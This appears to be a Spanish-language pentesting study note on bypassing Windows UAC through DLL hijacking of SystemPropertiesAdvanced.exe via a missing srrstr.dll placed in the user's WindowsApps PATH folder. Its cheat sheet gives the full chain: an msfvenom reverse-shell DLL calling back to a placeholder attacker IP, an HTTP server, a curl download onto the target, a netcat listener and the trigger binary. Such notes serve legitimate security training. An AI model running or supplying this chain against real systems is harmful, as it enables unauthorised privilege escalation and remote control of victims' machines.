---
tags:
  - windows
  - privex
---
## Conceptos Clave (TL;DR)

- UAC (User Account Control) obliga a que procesos de un administrador se ejecuten por defecto con un token de **integridad media** (usuario estándar), salvo que se eleve explícitamente. **No es un security boundary**, solo una capa de fricción/ruido adicional.
- La cuenta RID 500 (Administrator integrado) siempre opera en integridad **Alta**. Cualquier otra cuenta de administrador con Admin Approval Mode (AAM) activo recibe dos tokens (estándar + elevado) y arranca en integridad **Media**.
- Las bypasses de UAC explotan **auto-elevating binaries** firmados por Microsoft que cargan DLLs inexistentes (DLL Hijacking) o que no validan rutas, aprovechando el **orden de búsqueda de DLLs de Windows**. El proyecto **UACME** documenta qué técnica funciona en qué build.
- El nivel de UAC (clave `ConsentPromptBehaviorAdmin`) determina cuántas bypasses son viables: en `0x5` (Always Notify, el más alto) hay muchas menos técnicas funcionales.

## Herramientas Clave

- **REG QUERY** – Leer valores de registro para confirmar si UAC está habilitado y su nivel de configuración.
- **whoami /user, /priv** – Verificar usuario actual, SID y privilegios habilitados/deshabilitados del token actual.
- **net localgroup administrators** – Confirmar membresía en el grupo de administradores locales.
- **[environment]::OSVersion.Version (PowerShell)** – Obtener el número de build de Windows para correlacionarlo con la base de datos de UACME.
- **UACME (GitHub)** – Catálogo de técnicas de bypass de UAC por número, build afectada y si tiene parche de Microsoft.
- **msfvenom** – Generar la DLL maliciosa con payload de reverse shell.
- **python3 -m http.server** – Servidor HTTP rápido en el atacante para entregar el payload al objetivo.
- **curl (en el target)** – Descargar la DLL maliciosa hacia la ruta vulnerable.
- **netcat (nc)** – Listener para recibir la shell inversa.
- **rundll32.exe** – Ejecutar manualmente la DLL para validar que el payload funciona antes de disparar el binario auto-elevado.
- **tasklist / taskkill** – Verificar y matar procesos `rundll32` previos que puedan interferir con la prueba final.

## Metodología Paso a Paso

1. **Enumeración del contexto actual**
   Verificar usuario, grupo y privilegios para confirmar que, aunque la cuenta pertenece a Administradores, el proceso actual corre con un token sin privilegios (UAC activo bloqueando la elevación automática).

2. **Confirmar estado y nivel de UAC**
   Consultar `EnableLUA` (¿UAC habilitado?) y `ConsentPromptBehaviorAdmin` (¿qué nivel de aviso?). Esto determina si vale la pena buscar un bypass y cuán restrictivo será.

3. **Identificar la build de Windows**
   Obtener el número de build vía PowerShell y cruzarlo contra la tabla de versiones de Windows 10 y contra la lista de UACME para elegir una técnica compatible (en este caso, técnica #54 desde build 14393, contra `SystemPropertiesAdvanced.exe` de 32 bits).

4. **Identificar el vector de hijacking**
   Investigar (vía blog/análisis) qué DLL inexistente intenta cargar el binario auto-elevante (`srrstr.dll`) y aplicar el orden de búsqueda de DLLs de Windows para encontrar una carpeta donde el usuario tenga permisos de escritura (ej. `WindowsApps` dentro de `%PATH%`).

5. **Generar el payload malicioso**
   Crear la DLL con el nombre exacto que el binario espera cargar, conteniendo un reverse shell.

6. **Entrega del payload**
   Levantar un servidor HTTP en el atacante y descargar la DLL en el target, colocándola en la ruta vulnerable identificada en el paso 4.

7. **Validación previa (sanity check)**
   Ejecutar la DLL manualmente con `rundll32` para confirmar que el payload funciona (debe devolver una shell con privilegios normales, sin elevación, ya que no se ha pasado por el binario auto-elevante).

8. **Limpieza de procesos**
   Matar las instancias de `rundll32` lanzadas en el paso anterior para evitar conflictos de carga de DLL o procesos zombie.

9. **Disparo del bypass real**
   Ejecutar el binario legítimo auto-elevante (`SystemPropertiesAdvanced.exe` en `SysWOW64`), que al iniciarse intentará cargar `srrstr.dll` desde el PATH, ejecutando la DLL maliciosa en un contexto de integridad alta sin disparar el prompt de UAC.

10. **Verificación de éxito**
    Recibir la shell en el listener y confirmar con `whoami /priv` que ahora aparecen privilegios adicionales (ej. `SeImpersonatePrivilege`, `SeDebugPrivilege` disponibles aunque Disabled, listos para habilitarse), confirmando integridad elevada.

## Cheat Sheet de Comandos

```cmd
:: Ver usuario actual y su SID
C:\> whoami /user

:: Confirmar membresia en el grupo de administradores locales
C:\> net localgroup administrators

:: Ver privilegios habilitados/deshabilitados del token actual
C:\> whoami /priv

:: Confirmar si UAC esta habilitado (EnableLUA = 0x1 significa habilitado)
C:\> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

:: Comprobar el nivel/comportamiento del prompt de UAC para administradores
C:\> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
```

```powershell
# Obtener la version de build de Windows (cruzar contra tabla de versiones/UACME)
PS C:\> [environment]::OSVersion.Version

# Revisar las carpetas del PATH para buscar directorios con permisos de escritura
PS C:\> cmd /c echo %PATH%
```

```bash
# Generar DLL maliciosa con reverse shell (payload x86 para version de 32 bits del binario objetivo)
# -p = payload, LHOST/LPORT = IP y puerto de callback, -f dll = formato de salida
msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<LISTENER_PORT> -f dll > <DLL_NAME>.dll

# Levantar servidor HTTP simple en el atacante para servir la DLL
# -m http.server = modulo nativo de python para servir el directorio actual
sudo python3 -m http.server <HTTP_PORT>

# Levantar listener de netcat para recibir la shell inversa
# -l = listen, -v = verbose, -n = no resolver DNS, -p = puerto a escuchar
nc -lvnp <LISTENER_PORT>
```

```powershell
# Descargar la DLL maliciosa desde el atacante a la carpeta vulnerable del PATH
# -O = guarda con el nombre/ruta especificada en el destino
PS C:\> curl http://<ATTACKER_IP>:<HTTP_PORT>/<DLL_NAME>.dll -O "C:\Users\<TARGET_USER>\AppData\Local\Microsoft\WindowsApps\<DLL_NAME>.dll"
```

```cmd
:: Probar manualmente la DLL (sin elevacion) para validar que el payload ejecuta correctamente
:: shell32.dll,Control_RunDLL = forma estandar de invocar una DLL arbitraria via rundll32
C:\> rundll32 shell32.dll,Control_RunDLL C:\Users\<TARGET_USER>\AppData\Local\Microsoft\WindowsApps\<DLL_NAME>.dll

:: Listar procesos rundll32 activos para limpiar antes del intento real
C:\> tasklist /svc | findstr "rundll32"

:: Matar el proceso rundll32 de prueba por PID
:: /PID = identifica el proceso, /F = fuerza la terminacion
C:\> taskkill /PID <PID> /F

:: Ejecutar el binario auto-elevante (version 32 bits, vive en SysWOW64) para disparar el hijacking real
C:\> C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
```

## Gotchas y Troubleshooting

- UAC **no es un límite de seguridad**: no asumas que detiene a un atacante, solo lo ralentiza y lo hace más ruidoso. No reportarlo como vulnerabilidad por sí solo.
- La cuenta **RID 500 (Administrator)** siempre corre en integridad Alta por defecto; el bypass de UAC aplica a *otras* cuentas de administrador creadas, que sí arrancan en integridad Media bajo AAM.
- Si `ConsentPromptBehaviorAdmin = 0x5` ("Always Notify"), el abanico de técnicas de bypass disponibles se reduce considerablemente respecto a niveles más bajos.
- El número de **build de Windows** es crítico: la técnica de UACME elegida debe ser compatible con esa build específica (en el ejemplo, build 14393 = Windows 10 v1607, técnica #54).
- El bug depende de que el binario auto-elevante intente cargar una DLL **inexistente** (`srrstr.dll`); hay que verificar previamente (vía blogs/análisis estáticos) cuál DLL falta para cada binario candidato.
- El **orden de búsqueda de DLLs** de Windows es la base del hijacking: directorio de la app -> System32 -> System (16 bits, no soportado en x64) -> directorio de Windows -> carpetas del `PATH`. Hay que encontrar una carpeta del PATH donde el usuario actual tenga permisos de escritura (en el ejemplo, `WindowsApps` dentro del perfil de usuario).
- Cuidado con la **arquitectura**: la técnica apunta específicamente a la versión de **32 bits** del binario, ubicada en `C:\Windows\SysWOW64\`, no en `System32` (que sería la versión de 64 bits).
- Antes de ejecutar el binario auto-elevante real, **matar cualquier proceso `rundll32` previo** lanzado durante las pruebas manuales; procesos colgados pueden interferir con la carga correcta de la DLL o con el listener.
- Tras el bypass exitoso, los privilegios elevados (`SeImpersonatePrivilege`, `SeDebugPrivilege`, etc.) pueden aparecer como **Disabled** en `whoami /priv`: están disponibles pero deben habilitarse explícitamente (ej. con herramientas como `EnableAllTokenPrivs` o exploits de impersonation) para usarse.
- Recordar siempre que la IP usada en `LHOST` corresponde a la interfaz **VPN/tun0** del atacante, no a una IP local de red interna.